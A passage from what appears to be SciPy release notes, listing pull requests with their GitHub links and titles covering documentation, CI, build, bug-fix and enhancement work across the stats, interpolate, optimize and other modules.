<https://github.com/scipy/scipy/pull/16735>`__: DOC: forward port 1.9.0 relnotes\n* `16738 <https://github.com/scipy/scipy/pull/16738>`__: REL: DOC: update version switcher\n* `16739 <https://github.com/scipy/scipy/pull/16739>`__: CI: move the py311-dev job over to Meson\n* `16740 <https://github.com/scipy/scipy/pull/16740>`__: DOC: Fix Sphinx markup.\n* `16742 <https://github.com/scipy/scipy/pull/16742>`__: CI: move test_numpy_main to linux_meson\n* `16743 <https://github.com/scipy/scipy/pull/16743>`__: DEP: interpolate: revert docstring only deprecation of fitpack...\n* `16747 <https://github.com/scipy/scipy/pull/16747>`__: DOC: sparse.linalg: Fix output in an example in the lobpcg docstring.\n* `16753 <https://github.com/scipy/scipy/pull/16753>`__: DOC: Integrate: Add improper integral examples for \\`dblquad\\`...\n* `16754 <https://github.com/scipy/scipy/pull/16754>`__: DOC: optimize: Fix mistake in a linprog example.\n* `16755 <https://github.com/scipy/scipy/pull/16755>`__: TST: sparse.linalg: Loosen tolerance for the lobpcg test 'test_tolerance_float32'\n* `16756 <https://github.com/scipy/scipy/pull/16756>`__: TST: test fixes for pypy\n* `16758 <https://github.com/scipy/scipy/pull/16758>`__: ENH: Release the GIL while computing KDE kernel estimate\n* `16761 <https://github.com/scipy/scipy/pull/16761>`__: DOC: add logo to readme.\n* `16762 <https://github.com/scipy/scipy/pull/16762>`__: MAINT: stats: mark slow tests\n* `16766 <https://github.com/scipy/scipy/pull/16766>`__: DOC: toolchain: fix numpy dependency for 1.7.2/3\n* `16770 <https://github.com/scipy/scipy/pull/16770>`__: ENH: stats: use Boost implementation of skewnorm cdf/ppf\n* `16772 <https://github.com/scipy/scipy/pull/16772>`__: DOC: add one :math: to docstring for consistency\n* `16776 <https://github.com/scipy/scipy/pull/16776>`__: BUG: Set nperseg size to the size of an already-initialized window...\n* `16778 <https://github.com/scipy/scipy/pull/16778>`__: MAINT: fix a couple of Mypy errors that appeared recently\n* `16779 <https://github.com/scipy/scipy/pull/16779>`__: TST: Interpolate: Move incorrectly located NDInterpolator tests\n* `16788 <https://github.com/scipy/scipy/pull/16788>`__: DOC, TST: clarify Voronoi Qz\n* `16790 <https://github.com/scipy/scipy/pull/16790>`__: ENH: stats.invgauss: use Boost implementation of ppf/isf\n* `16791 <https://github.com/scipy/scipy/pull/16791>`__: MAINT: stats.skewnorm: fix fit when data skewness is greater...\n* `16793 <https://github.com/scipy/scipy/pull/16793>`__: DOC: optimize: add tutorial for milp\n* `16795 <https://github.com/scipy/scipy/pull/16795>`__: DOC: Embed method signatures of \\`spatial.transform.Rotation\\`\n* `16797 <https://github.com/scipy/scipy/pull/16797>`__: ENH add extrapolate to BSpline.design_matrix\n* `16799 <https://github.com/scipy/scipy/pull/16799>`__: DOC: optimize.root_scalar: improve parametrization of methods\n* `16800 <https://github.com/scipy/scipy/pull/16800>`__: MAINT: remove \\`_lib/_c99compat.h\\` and use C99 rather than \\`npy_math.h\\`...\n* `16801 <https://github.com/scipy/scipy/pull/16801>`__: ENH: added the spectral 2-norm to _norm.py\n* `16804 <https://github.com/scipy/scipy/pull/16804>`__: ENH: stats.weibull_min: override fit\n* `16806 <https://github.com/scipy/scipy/pull/16806>`__: DEV: update pydevtool version to propagate exit codes\n* `16809 <https://github.com/scipy/scipy/pull/16809>`__: Doc: Added missing \"import numpy as np\" to docstring examples...\n* `16811 <https://github.com/scipy/scipy/pull/16811>`__: DOC: fix broken links\n* `16816 <https://github.com/scipy/scipy/pull/16816>`__: MAINT: special: remove one \\`libnpymath\\` dependency; more \\`NPY_\\`...\n* `16817 <https://github.com/scipy/scipy/pull/16817>`__: MAINT: remove \\`NPY_INLINE\\`, use \\`inline\\` instead\n* `16818 <https://github.com/scipy/scipy/pull/16818>`__: MAINT: update PROPACK git submodule to get rid of prints in test...\n* `16826 <https://github.com/scipy/scipy/pull/16826>`__: MAINT: fix some build warnings from \\`special/ellip_harm.pxd\\`\n* `16828 <https://github.com/scipy/scipy/pull/16828>`__: DOC: add NumPy import in scipy.io examples\n* `16829 <https://github.com/scipy/scipy/pull/16829>`__: Interpn nonscalar followup\n* `16830 <https://github.com/scipy/scipy/pull/16830>`__: DOC: Add plot to circmean docstring\n* `16831 <https://github.com/scipy/scipy/pull/16831>`__: DOC: special: Several docstring updates.\n* `16832 <https://github.com/scipy/scipy/pull/16832>`__: DOC: add NumPy import in scipy.optimize examples\n* `16834 <https://github.com/scipy/scipy/pull/16834>`__: DOC: Improve circular stats doc\n* `16835 <https://github.com/scipy/scipy/pull/16835>`__: ENH: stats.ttest_1samp: add confidence_interval and df\n* `16837 <https://github.com/scipy/scipy/pull/16837>`__: DOC: interpolate: small example code improvement for \\`BSpline.basis_element\\`\n* `16840 <https://github.com/scipy/scipy/pull/16840>`__: ENH: BSplines.design_matrix performance improvement\n* `16843 <https://github.com/scipy/scipy/pull/16843>`__: ENH: Handle np array methods in stats.binned_statistic_dd\n* `16847 <https://github.com/scipy/scipy/pull/16847>`__: DOC: interpolate.{RegularGridInterpolator, interpn} add note...\n* `16848 <https://github.com/scipy/scipy/pull/16848>`__: ENH: stats.anderson: add fit parameters to result\n* `16853 <https://github.com/scipy/scipy/pull/16853>`__: DOC: interpolate: improve \\`interpolate.make_interp.spline\\`...\n* `16854 <https://github.com/scipy/scipy/pull/16854>`__: MAINT: Delay \\`pooch\\` import error for \\`scipy.datasets\\`\n* `16855 <https://github.com/scipy/scipy/pull/16855>`__: Roadmap update: scipy.interpolate and Fortran libs\n* `16856 <https://github.com/scipy/scipy/pull/16856>`__: DOC: interpolate: add default spline degree value for \\`InterpolatedUnivariateSpline\\`\n* `16857 <https://github.com/scipy/scipy/pull/16857>`__: ENH : remove an expected warning in BarycentricInterpolator\n* `16858 <https://github.com/scipy/scipy/pull/16858>`__: ENH: Modify scipy.optimize.least_squares to accept bounds of...\n* `16860 <https://github.com/scipy/scipy/pull/16860>`__: DOC: interpolate: improve spline smoothing parameter docs.\n* `16863 <https://github.com/scipy/scipy/pull/16863>`__: DOC: Adding docs contribution guidelines\n* `16864 <https://github.com/scipy/scipy/pull/16864>`__: DOC: stats: Some updates:\n* `16865 <https://github.com/scipy/scipy/pull/16865>`__: DOC: interpolate: improve \\`make_lsq_spline\\` docs\n* `16866 <https://github.com/scipy/scipy/pull/16866>`__: DEP, DOC: Show deprecated methods in docs and fix overwriting...\n* `16867 <https://github.com/scipy/scipy/pull/16867>`__: DOC: fix an accuracy issue in the docstring of \\`Rotation.align_vectors\\`\n* `16869 <https://github.com/scipy/scipy/pull/16869>`__: DOC: Added missing 'import numpy as np' to docstring examples...\n* `16873 <https://github.com/scipy/scipy/pull/16873>`__: MAINT: stats.multinomial: don't alter p[-1] when p[:-1].sum()...\n* `16874 <https://github.com/scipy/scipy/pull/16874>`__: DOC: signal: Add 'Examples' to the 'normalize' docstring.\n* `16884 <https://github.com/scipy/scipy/pull/16884>`__: DOC: improve installing from source instructions\n* `16885 <https://github.com/scipy/scipy/pull/16885>`__: TST: Interpolate: Parameterise RegularGridInterpolator tests\n* `16886 <https://github.com/scipy/scipy/pull/16886>`__: CI: wheels only on scipy [skip azp][skip github]\n* `16887 <https://github.com/scipy/scipy/pull/16887>`__: DOC: optimize.linprog: adjust tutorial to address gh16531\n* `16888 <https://github.com/scipy/scipy/pull/16888>`__: DOC: outline how cibuildwheel is triggered and runs in CI\n* `16889 <https://github.com/scipy/scipy/pull/16889>`__: MAINT: interpolate: Remove a couple unused imports.\n* `16890 <https://github.com/scipy/scipy/pull/16890>`__: ENH: optimize.OptimizeResult: improve pretty-printing\n* `16891 <https://github.com/scipy/scipy/pull/16891>`__: TST: Interpolate: rename test so that is executed\n* `16893 <https://github.com/scipy/scipy/pull/16893>`__: DOC: add diagram explaining how Docker images get built and used...\n* `16896 <https://github.com/scipy/scipy/pull/16896>`__: DOC: Fix broken link in the \"Additional Git Resources\" page.\n* `16897 <https://github.com/scipy/scipy/pull/16897>`__: Pass down mip_rel_gap to the HiGHS optimizer\n* `16899 <https://github.com/scipy/scipy/pull/16899>`__: DOC: add legend to rv_histogram plot\n* `16902 <https://github.com/scipy/scipy/pull/16902>`__: ENH: stats.ttest_rel: add confidence_interval to result\n* `16903 <https://github.com/scipy/scipy/pull/16903>`__: DOC: interpolate: add actual smoothing condition for \\`UnivariateSpline\\`\n* `16906 <https://github.com/scipy/scipy/pull/16906>`__: DOC: fixes for refguide check issues\n* `16907 <https://github.com/scipy/scipy/pull/16907>`__: BUG: stats: expect method of the vonmises distribution\n* `16910 <https://github.com/scipy/scipy/pull/16910>`__: MAINT: forward port 1.9.1 relnotes\n* `16913 <https://github.com/scipy/scipy/pull/16913>`__: ENH:interpolate: allow interp1d to take single value\n* `16916 <https://github.com/scipy/scipy/pull/16916>`__: DOC: add note about using interpn for data on a regular grid\n* `16923 <https://github.com/scipy/scipy/pull/16923>`__: MAINT: integrate.qmc_quad: add QMC quadrature\n* `16924 <https://github.com/scipy/scipy/pull/16924>`__: Fix compilation with -Wincompatible-function-pointer-types\n* `16931 <https://github.com/scipy/scipy/pull/16931>`__: DOC: add details on Meson build debugging and introspection\n* `16933 <https://github.com/scipy/scipy/pull/16933>`__: MAINT : interpolate: added test for DivideByZero warning silencing...\n* `16937 <https://github.com/scipy/scipy/pull/16937>`__: MAINT: refer to python3 in refguide_check\n* `16939 <https://github.com/scipy/scipy/pull/16939>`__: MAINT: stats: move \\`_contains_nan\\` function to \\`_lib._util.py\\`\n* `16940 <https://github.com/scipy/scipy/pull/16940>`__: DOC: Documentation note update for truncnorm\n* `16941 <https://github.com/scipy/scipy/pull/16941>`__: MAINT: support logpdf in NumericalInverseHermite (stats.sampling)\n* `16948 <https://github.com/scipy/scipy/pull/16948>`__: DOC: sparse.linalg.svds: fix intermittent refguide check failure\n* `16950 <https://github.com/scipy/scipy/pull/16950>`__: DOC: Add examples for common Bessel functions\n* `16951 <https://github.com/scipy/scipy/pull/16951>`__: ENH: stats.fit: add plot_types to FitResult.plot\n* `16953 <https://github.com/scipy/scipy/pull/16953>`__: DEV: update dev.py to only install changed files\n* `16955 <https://github.com/scipy/scipy/pull/16955>`__: BLD: fix up or suppress Fortran build warnings\n* `16956 <https://github.com/scipy/scipy/pull/16956>`__: BLD: fix meson version checks for MSVC\n* `16958 <https://github.com/scipy/scipy/pull/16958>`__: ENH: stats.crosstab: convert output tuple to bunch\n* `16959 <https://github.com/scipy/scipy/pull/16959>`__: DOC: Add example for morlet in scipy.signal\n* `16960 <https://github.com/scipy/scipy/pull/16960>`__: DOC: Fix indentation in benchmarking.rst\n* `16963 <https://github.com/scipy/scipy/pull/16963>`__: DOC: Update 2 links to point to stable.\n* `16967 <https://github.com/scipy/scipy/pull/16967>`__: ENH: stats.goodness_of_fit: a general goodness of fit test\n* `16968 <https://github.com/scipy/scipy/pull/16968>`__: ENH: Close parenthesis in numpy version warning\n* `16976 <https://github.com/scipy/scipy/pull/16976>`__: DOC: stats.qmc: fix description of seed parameter\n* `16980 <https://github.com/scipy/scipy/pull/16980>`__: DOC: fix duplicate word typos.\n* `16986 <https://github.com/scipy/scipy/pull/16986>`__: DOC: Fix link to rendered docs in documentation guide\n* `16987 <https://github.com/scipy/scipy/pull/16987>`__: ENH: stats.gaussian_kde: replace use of inv_cov in logpdf\n* `16989 <https://github.com/scipy/scipy/pull/16989>`__: DOC: edited t_span parameter description in integrate.solve_ivp\n* `16990 <https://github.com/scipy/scipy/pull/16990>`__: CI: enable uploads for (weekly) nightlies and update how action...\n* `16992 <https://github.com/scipy/scipy/pull/16992>`__: CI: upgrade CI image to run on Ubuntu 22.04 instead of 20.04\n* `16995 <https://github.com/scipy/scipy/pull/16995>`__: DOC: stats: fix incorrectly documented statistic attribute for...\n* `17003 <https://github.com/scipy/scipy/pull/17003>`__: DOC: Add examples for a few Bessel functions\n* `17005 <https://github.com/scipy/scipy/pull/17005>`__: CI: pin OpenBLAS to specific build in macOS job to avoid gges...\n* `17006 <https://github.com/scipy/scipy/pull/17006>`__: ENH: stats.spearmanr: add statistic attribute to result object...\n* `17007 <https://github.com/scipy/scipy/pull/17007>`__: ENH: stats.kendalltau: add statistic attribute to result object...\n* `17008 <https://github.com/scipy/scipy/pull/17008>`__: ENH: stats.weightedtau: add statistic attribute to result object\n* `17009 <https://github.com/scipy/scipy/pull/17009>`__: Revert \"CI: pin OpenBLAS to specific build in macOS job to avoid...\n* `17014 <https://github.com/scipy/scipy/pull/17014>`__: MAINT: remove unused variables and imports\n* `17016 <https://github.com/scipy/scipy/pull/17016>`__: ENH: stats.pearsonr, stats.pointbiserialr: add statistic/correlation...\n* `17017 <https://github.com/scipy/scipy/pull/17017>`__: ENH: stats.somersd: add correlation attribute to result object\n* `17021 <https://github.com/scipy/scipy/pull/17021>`__: FIX: \\`dev.py build\\` parallelism behaviour and fixed typos\n* `17022 <https://github.com/scipy/scipy/pull/17022>`__: Explain where LIL comes from\n* `17027 <https://github.com/scipy/scipy/pull/17027>`__: Fix explanation of LIst of List sparse matrix\n* `17029 <https://github.com/scipy/scipy/pull/17029>`__: CI: cirrus for building aarch64\n* `17030 <https://github.com/scipy/scipy/pull/17030>`__: ENH: stats.permutation_test: improve performance of samples/pairings...\n* `17032 <https://github.com/scipy/scipy/pull/17032>`__: TST: stats.fit: fix random state\n* `17034 <https://github.com/scipy/scipy/pull/17034>`__: TST: stats.jarque_bera: fix test failure due to NumPy update\n* `17036 <https://github.com/scipy/scipy/pull/17036>`__: DEV: Update GPG key in Docker [Gitpod]\n* `17038 <https://github.com/scipy/scipy/pull/17038>`__: deduplicate \\`splint\\` in FITPACK wrappers; take 3\n* `17039 <https://github.com/scipy/scipy/pull/17039>`__: ENH: add a \\`stats.expectile\\` function\n* `17041 <https://github.com/scipy/scipy/pull/17041>`__: DOC: Add examples for integrals of Bessel functions\n* `17048 <https://github.com/scipy/scipy/pull/17048>`__: DOC:signal: Fix typo in TransferFunction\n* `17049 <https://github.com/scipy/scipy/pull/17049>`__: TST: stats.jarque_bera: fix test failure due to NumPy update\n* `17051 <https://github.com/scipy/scipy/pull/17051>`__: ENH: support complex functions in integrate.quad\n* `17052 <https://github.com/scipy/scipy/pull/17052>`__: BLD: implement symbol hiding for Meson through a linker version...\n* `17057 <https://github.com/scipy/scipy/pull/17057>`__: Fix or avoid various test failures that are showing up in CI\n* `17062 <https://github.com/scipy/scipy/pull/17062>`__: Add location and sign to KS test result\n* `17063 <https://github.com/scipy/scipy/pull/17063>`__: CI: fix uploading of nightly wheels\n* `17068 <https://github.com/scipy/scipy/pull/17068>`__: MAINT: Removed unused imports.\n* `17071 <https://github.com/scipy/scipy/pull/17071>`__: DOC: update maxfun in scipy.optimize.minimize(method=\u2019L-BFGS-B\u2019)...\n* `17073 <https://github.com/scipy/scipy/pull/17073>`__: DOC: examples for derivatives of Bessel functions\n* `17076 <https://github.com/scipy/scipy/pull/17076>`__: DOC: spatial: Copy-edit the voronoi_plot_2d example.\n* `17079 <https://github.com/scipy/scipy/pull/17079>`__: BUG: fix \\`signal.sosfilt\\` issue with complex dtypes and Intel...\n* `17081 <https://github.com/scipy/scipy/pull/17081>`__: DOC: Fix formatting in svds docstrings\n* `17083 <https://github.com/scipy/scipy/pull/17083>`__: DOC: Fix broken link for environment variables NumPy doc\n* `17085 <https://github.com/scipy/scipy/pull/17085>`__: DOC: optimize: add link to SciPy cookbooks milp tutorials\n* `17091 <https://github.com/scipy/scipy/pull/17091>`__: MAINT: interpolate remove duplication of FITPACK interface \\`sproot\\`.\n* `17093 <https://github.com/scipy/scipy/pull/17093>`__: ENH: Improves behavior of scipy.optimize.linprog (#17074)\n* `17094 <https://github.com/scipy/scipy/pull/17094>`__: DOC: examples for roots of Bessel functions\n* `17099 <https://github.com/scipy/scipy/pull/17099>`__: BLD: turn off fast-math for Intel compilers\n* `17103 <https://github.com/scipy/scipy/pull/17103>`__: ENH: stats.Covariance: add CovViaDiagonal\n* `17106 <https://github.com/scipy/scipy/pull/17106>`__: CI: fix testing of \\`SCIPY_USE_PYTHRAN=0\\`, and upgrade to pythran...\n* `17108 <https://github.com/scipy/scipy/pull/17108>`__: DOC: Reformulate ufunc description in special doc page\n* `17109 <https://github.com/scipy/scipy/pull/17109>`__: BLD: Ensure Intel Fortran handles negative 0 as expected.\n* `17110 <https://github.com/scipy/scipy/pull/17110>`__: DOC: add Numpy import to scipy.sparse examples\n* `17112 <https://github.com/scipy/scipy/pull/17112>`__: ENH: Add support for bounds class in curve_fit\n* `17115 <https://github.com/scipy/scipy/pull/17115>`__: DOC: add Numpy import to examples\n* `17117 <https://github.com/scipy/scipy/pull/17117>`__: ENH: stats.logistic: override fit for remaining cases\n* `17118 <https://github.com/scipy/scipy/pull/17118>`__: ENH: Support for complex functions in binned_statistic_dd\n* `17122 <https://github.com/scipy/scipy/pull/17122>`__: ENH: remove duplicate function call\n* `17126 <https://github.com/scipy/scipy/pull/17126>`__: MAINT, ENH: scipy.stats: Refactor \\`directionalmean\\` to return...\n* `17128 <https://github.com/scipy/scipy/pull/17128>`__: ENH: stats.covariance: add CovViaCholesky\n* `17130 <https://github.com/scipy/scipy/pull/17130>`__: DOC: remove inconsistent messages\n* `17135 <https://github.com/scipy/scipy/pull/17135>`__: ENH: stats.Covariance: specifying covariance matrix by its eigendecomposition\n* `17138 <https://github.com/scipy/scipy/pull/17138>`__: CI: add permission to GH actions.\n* `17140 <https://github.com/scipy/scipy/pull/17140>`__: BUG: Fix issue with shgo not correctly passing jac to minimizer\n* `17141 <https://github.com/scipy/scipy/pull/17141>`__: ENH: stats.fit: add maximum spacing estimation\n* `17144 <https://github.com/scipy/scipy/pull/17144>`__: DOC: replace \\`set_tight_layout\\` with \\`set_layout_engine\\`...\n* `17147 <https://github.com/scipy/scipy/pull/17147>`__: BENCH: remove \\`--quick\\` flag to \\`asv run\\` in dev.py\n* `17149 <https://github.com/scipy/scipy/pull/17149>`__: MAINT: remove certifi py3.11 warning filter\n* `17152 <https://github.com/scipy/scipy/pull/17152>`__: ENH/MAINT: \\`qmc.LatinHypercube\\`: deprecate centered with scramble\n* `17157 <https://github.com/scipy/scipy/pull/17157>`__: ENH: Added value_indices() function to scipy.ndimage\n* `17159 <https://github.com/scipy/scipy/pull/17159>`__: MAINT: spatial: Skip \\`test_massive_arr_overflow\\` on systems...\n* `17161 <https://github.com/scipy/scipy/pull/17161>`__: MAINT: stats.sampling.NumericalInverseHermite: private distribution...\n* `17163 <https://github.com/scipy/scipy/pull/17163>`__: ENH: Add \\`download_all\\` utility method & script\n* `17169 <https://github.com/scipy/scipy/pull/17169>`__: MAINT: special: Loosen the tolerance for a test of powm1.\n* `17170 <https://github.com/scipy/scipy/pull/17170>`__: MAINT: better handling of mode/center outside of the domain in...\n* `17175 <https://github.com/scipy/scipy/pull/17175>`__: MAINT: forward port 1.9.2 relnotes\n* `17177 <https://github.com/scipy/scipy/pull/17177>`__: DOC: stats: Fix versionadded markup for odds_ratio\n* `17178 <https://github.com/scipy/scipy/pull/17178>`__: DOC: interpolate: discuss failure modes of SmoothBivariateSpline\n* `17180 <https://github.com/scipy/scipy/pull/17180>`__: DEP: interpolate: deprecate interp2d\n* `17181 <https://github.com/scipy/scipy/pull/17181>`__: CI: Fix when wheels are built for staging\n* `17182 <https://github.com/scipy/scipy/pull/17182>`__: MAINT: fix typo \"mat[r]ix\"\n* `17183 <https://github.com/scipy/scipy/pull/17183>`__: DOC: examples for \\`ive\\` and \\`kve\\`\n* `17184 <https://github.com/scipy/scipy/pull/17184>`__: DOC: stats: Fix the 1.9.0 release note about the 'weights' parameter...\n* `17188 <https://github.com/scipy/scipy/pull/17188>`__: DOC: update version switcher for 1.9.2\n* `17198 <https://github.com/scipy/scipy/pull/17198>`__: MAINT: stats: remove use of interp2d from levy_stable._fitstart\n* `17199 <https://github.com/scipy/scipy/pull/17199>`__: DOC: Fix typos in IIR design argument documentation\n* `17215 <https://github.com/scipy/scipy/pull/17215>`__: MAINT: remove code for old numpy versions\n* `17217 <https://github.com/scipy/scipy/pull/17217>`__: MAINT: interpolate/RGI: make all _evaluate_YYY methods use self.values\n* `17223 <https://github.com/scipy/scipy/pull/17223>`__: DOC: linalg: Expand the qz example.\n* `17227 <https://github.com/scipy/scipy/pull/17227>`__: TST: stats.sampling.NumericalInverseHermite: filter all RuntimeWarnings\n* `17230 <https://github.com/scipy/scipy/pull/17230>`__: ENH: subclass-friendly refactor RegularGridInterpolator\n* `17233 <https://github.com/scipy/scipy/pull/17233>`__: DOC: examples for Struve functions\n* `17236 <https://github.com/scipy/scipy/pull/17236>`__: stats/distributions: make rv_sample public, allow subclassing\n* `17237 <https://github.com/scipy/scipy/pull/17237>`__: ENH: add conditional_table to SciPy.stats.\n* `17238 <https://github.com/scipy/scipy/pull/17238>`__: DOC: linalg: Several docstring updates.\n* `17243 <https://github.com/scipy/scipy/pull/17243>`__: DOC: special: Updates for smirnov and smirnovi\n* `17247 <https://github.com/scipy/scipy/pull/17247>`__: MAINT: optimize.leastsq: fix covariance not SPD\n* `17256 <https://github.com/scipy/scipy/pull/17256>`__: doc/RegularizedIncompleteBetaFunction\n* `17258 <https://github.com/scipy/scipy/pull/17258>`__: MAINT: stats.multivariate_normal: frozen rvs should pass cov_object...\n* `17259 <https://github.com/scipy/scipy/pull/17259>`__: DOC: CI: Add note about skipping Cirrus CI.\n* `17262 <https://github.com/scipy/scipy/pull/17262>`__: MAINT: forward port 1.9.3 relnotes\n* `17264 <https://github.com/scipy/scipy/pull/17264>`__: DOC: update version switcher for 1.9.3\n* `17273 <https://github.com/scipy/scipy/pull/17273>`__: TST: linalg: temporarily silence failure in test_solve_discrete_are\n* `17276 <https://github.com/scipy/scipy/pull/17276>`__: MAINT/ENH: stats.multivariate_normal.rvs: fix shape and speed...\n* `17277 <https://github.com/scipy/scipy/pull/17277>`__: ENH: Random unit vector distribution\n* `17279 <https://github.com/scipy/scipy/pull/17279>`__: TST: mark no_segmentation fault test for DIRECT as xslow\n* `17280 <https://github.com/scipy/scipy/pull/17280>`__: DOC: example for voigt_profile\n* `17283 <https://github.com/scipy/scipy/pull/17283>`__: STY: stats.Covariance: fix lint issue in \\`main\\`\n* `17284 <https://github.com/scipy/scipy/pull/17284>`__: MAINT: special: Loosen tolerance in test_sinpi() and test_cospi().\n* `17291 <https://github.com/scipy/scipy/pull/17291>`__: Cythonize 2D linear code path in RegularGridInterpolator\n* `17296 <https://github.com/scipy/scipy/pull/17296>`__: Fix test fails caused by pytest 7.1.3\n* `17298 <https://github.com/scipy/scipy/pull/17298>`__: DOC: Add examples to Stats Anderson\n* `17299 <https://github.com/scipy/scipy/pull/17299>`__: DOC: interpolate: Extrapolation tips and tricks\n* `17301 <https://github.com/scipy/scipy/pull/17301>`__: DOC, MAINT: remove use of inspect.formatargspec during doc build\n* `17302 <https://github.com/scipy/scipy/pull/17302>`__: MAINT: special: Use boost for special.hyp1f1 with real inputs.\n* `17303 <https://github.com/scipy/scipy/pull/17303>`__: Remove handwritten \\`_fitpack.spalde\\` : a rebase of pr/17145\n* `17304 <https://github.com/scipy/scipy/pull/17304>`__: ENH: stats: implement _sf and _isf for invweibull.\n* `17305 <https://github.com/scipy/scipy/pull/17305>`__: BUG: interpolate: allow zero-sized data arrays\n* `17313 <https://github.com/scipy/scipy/pull/17313>`__: DOC: interpolate: add a note on data with different scales\n* `17314 <https://github.com/scipy/scipy/pull/17314>`__: DOC: interpolate/tutorial: add a length-1 example\n* `17315 <https://github.com/scipy/scipy/pull/17315>`__: MAINT: special: Remove tests of numpy functions arccosh, arcsinh...\n* `17317 <https://github.com/scipy/scipy/pull/17317>`__: DOC: interpolate/tutorial: add an example for equally-spaced...\n* `17319 <https://github.com/scipy/scipy/pull/17319>`__: DOC: references and examples for huber/pseudo_huber\n* `17331 <https://github.com/scipy/scipy/pull/17331>`__: CI: On Azure, pin pytest-xdist to version 2.5.0\n* `17340 <https://github.com/scipy/scipy/pull/17340>`__: DOC: clarify use of bounds with basinhopping\n* `17345 <https://github.com/scipy/scipy/pull/17345>`__: ENH: commit to close #1261 (trac 734) by adding xtol argument.\n* `17346 <https://github.com/scipy/scipy/pull/17346>`__: BLD: fix \\`SCIPY_USE_PYTHRAN=0\\` usage for the Meson build\n* `17349 <https://github.com/scipy/scipy/pull/17349>`__: DOC: Fix signal docstrings; finish adding 'import numpy as np'\n* `17351 <https://github.com/scipy/scipy/pull/17351>`__: CI: Pin ninja==1.10.2.4 to avoid bug in 1.11.1 that breaks meson.\n* `17355 <https://github.com/scipy/scipy/pull/17355>`__: DOC: spatial: Fix some docstrings.\n* `17359 <https://github.com/scipy/scipy/pull/17359>`__: CI: ninja packages are repaired, so unpin.\n* `17361 <https://github.com/scipy/scipy/pull/17361>`__: DOC: examples for gdtr and gdtrc\n* `17363 <https://github.com/scipy/scipy/pull/17363>`__: DOC: adjust the deprecation notice for interp2d\n* `17366 <https://github.com/scipy/scipy/pull/17366>`__: DOC/MAINT: clean doctests namespace\n* `17367 <https://github.com/scipy/scipy/pull/17367>`__: DOC: Add missing \\`build\\` parameter to \\`dev.py\\`\n* `17369 <https://github.com/scipy/scipy/pull/17369>`__: DOC: consistent use of \\`=\\` for argument documentation\n* `17371 <https://github.com/scipy/scipy/pull/17371>`__: DOC: update RBF tutorial with new \\`RBFInterpolator\\`\n* `17372 <https://github.com/scipy/scipy/pull/17372>`__: BLD: update to Meson 0.64.0, remove \\`pure: false\\` lines\n* `17374 <https://github.com/scipy/scipy/pull/17374>`__: DOC: \\`special.itairy\\` example\n* `17376 <https://github.com/scipy/scipy/pull/17376>`__: DOC: Add examples to stats.mstats.find_repeats\n* `17395 <https://github.com/scipy/scipy/pull/17395>`__: DOC: optimize: minimize doc to reflect tnc's deprecation of maxiter\n* `17397 <https://github.com/scipy/scipy/pull/17397>`__: BUG: signal: Change types in the upfirdn utility function _output_len()\n* `17399 <https://github.com/scipy/scipy/pull/17399>`__: DOC: signal.iirdesign: remove \\`bessel\\` from supported filter...\n* `17400 <https://github.com/scipy/scipy/pull/17400>`__: TST: use norm in signal.TestBessel.test_fs_param\n* `17409 <https://github.com/scipy/scipy/pull/17409>`__: DOC: Examples for special functions related to F distribution\n* `17415 <https://github.com/scipy/scipy/pull/17415>`__: MAINT: Python 3.8 typing simplify\n* `17416 <https://github.com/scipy/scipy/pull/17416>`__: BLD: fix a lot of configuration warnings by using \\`fs.copyfile\\`\n* `17417 <https://github.com/scipy/scipy/pull/17417>`__: BUG: integrate: simpson didn't handle integer n-d arrays.\n* `17418 <https://github.com/scipy/scipy/pull/17418>`__: DOC: special: Remove duplicate imports from special examples.\n* `17423 <https://github.com/scipy/scipy/pull/17423>`__: Documentation to fix #17089\n* `17426 <https://github.com/scipy/scipy/pull/17426>`__: BLD: fix for propack and boost submodules - don't ask for native...\n* `17427 <https://github.com/scipy/scipy/pull/17427>`__: DOC: optimize.linprog: adjust HiGHS URL\n* `17430 <https://github.com/scipy/scipy/pull/17430>`__: BLD: define NDEBUG to mimic cmake release build\n* `17433 <https://github.com/scipy/scipy/pull/17433>`__: MAINT/TST: improved test coverage for DIRECT optimizer\n* `17439 <https://github.com/scipy/scipy/pull/17439>`__: DOC: Improve example for uniform_direction distribution\n* `17446 <https://github.com/scipy/scipy/pull/17446>`__: MAINT: stats.gaussian_kde: error early if n_features > n_data\n* `17447 <https://github.com/scipy/scipy/pull/17447>`__: MAINT: optimize.fminbound/minimize_scalar: add references, distinguish...\n* `17448 <https://github.com/scipy/scipy/pull/17448>`__: MAINT: optimize.minimize_scalar: always acknowledge 'bounds'...\n* `17449 <https://github.com/scipy/scipy/pull/17449>`__: MAINT: remove remaining occurrences of unicode\n* `17457 <https://github.com/scipy/scipy/pull/17457>`__: DOC: Double Integral Example Typo\n* `17466 <https://github.com/scipy/scipy/pull/17466>`__: BUG: stats: Fix for gh-17444.\n* `17467 <https://github.com/scipy/scipy/pull/17467>`__: BUG: ndimage: Don't use np.int0 (it is the same as np.intp)\n* `17469 <https://github.com/scipy/scipy/pull/17469>`__: BUG: stats: Random parameters in \\`pytest.mark.parametrize()\\`...\n* `17471 <https://github.com/scipy/scipy/pull/17471>`__: MAINT: stats.rv_count: revert gh-17236\n* `17472 <https://github.com/scipy/scipy/pull/17472>`__: Getting rid of _make_points_and_values_ascending and its unnecessary...\n* `17478 <https://github.com/scipy/scipy/pull/17478>`__: ENH: Add clear_cache utility for \\`scipy.datasets\\`\n* `17481 <https://github.com/scipy/scipy/pull/17481>`__: MAINT: special: remove more \\`npy_math.h\\` usage\n* `17482 <https://github.com/scipy/scipy/pull/17482>`__: MAINT: stats: Unconditionally disable boost double promotion.\n* `17484 <https://github.com/scipy/scipy/pull/17484>`__: DOC: remove hard-coded value from PoissonDisk example\n* `17485 <https://github.com/scipy/scipy/pull/17485>`__: ENH: increase range of vonmises entropy\n* `17487 <https://github.com/scipy/scipy/pull/17487>`__: CI: pin setuptools for musllinux\n* `17489 <https://github.com/scipy/scipy/pull/17489>`__: BUG: ndimage: Work around gh-17270\n* `17496 <https://github.com/scipy/scipy/pull/17496>`__: DEV: dev.py: make lint task consistent with CI\n* `17500 <https://github.com/scipy/scipy/pull/17500>`__: MAINT: special: Remove references to nonexistent function exp1m.\n* `17501 <https://github.com/scipy/scipy/pull/17501>`__: Minor: Misspelling typos fixed in _svds.py\n* `17504 <https://github.com/scipy/scipy/pull/17504>`__: CI: PRs run against merged main [skip circle][skip gh][skip azp]\n* `17512 <https://github.com/scipy/scipy/pull/17512>`__: TST: interpolate: stop skipping a test with zero-sized arrays\n* `17513 <https://github.com/scipy/scipy/pull/17513>`__: BUG: optimize: fixed issue 17380\n* `17526 <https://github.com/scipy/scipy/pull/17526>`__: BUG, DOC: stats: fix 